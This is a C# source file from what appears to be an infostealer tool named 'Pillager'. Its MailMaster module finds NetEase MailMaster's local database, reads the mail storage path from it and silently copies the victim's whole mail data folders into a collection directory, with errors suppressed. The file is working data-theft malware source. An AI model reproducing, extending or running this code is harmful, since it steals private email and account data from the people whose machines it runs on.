using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Mails
{
    internal class MailMaster
    {
        public static string MailName = "MailMaster";

        private static string GetDataPath()
        {
            string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
            if (!File.Exists(sqlpath)) return "";
            string db_tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(sqlpath, db_tempFile, true);
                byte[] configdb = File.ReadAllBytes(db_tempFile);
                List<int> offsets = FindBytes(configdb, Encoding.UTF8.GetBytes("DataPath"));
                foreach (int offset in offsets) 
                {
                    if (configdb[offset + 8] != 0x20)
                    {
                        int size = (int)Math.Round((configdb[offset - 1] - 13L) / 2.0);
                        byte[] bytes = configdb.Skip(offset + 8).Take(size).ToArray();
                        return Encoding.UTF8.GetString(bytes);
                    }
                }
            }
            catch { }
            File.Delete(db_tempFile);
            return "";
        }

        public static List<int> FindBytes(byte[] src, byte[] find)
        {
            List<int> offsets = new List<int>();
            if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length) return offsets;
            for (int i = 0; i < src.Length - find.Length + 1; i++)
            {
                if (src[i] == find[0])
                {
                    for (int m = 1; m < find.Length; m++)
                    {
                        if (src[i + m] != find[m]) break;
                        if (m == find.Length - 1) offsets.Add(i);
                    }
                }
            }
            return offsets;
        }

        public static void Save(string path)
        {
            try
            {
                string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data");
                if (!Directory.Exists(sqlpath)) return;
                string datapath = GetDataPath();
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                foreach (var directory in Directory.GetDirectories(datapath))
                {
                    Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
                }
            }
            catch { }
        }
    }
}
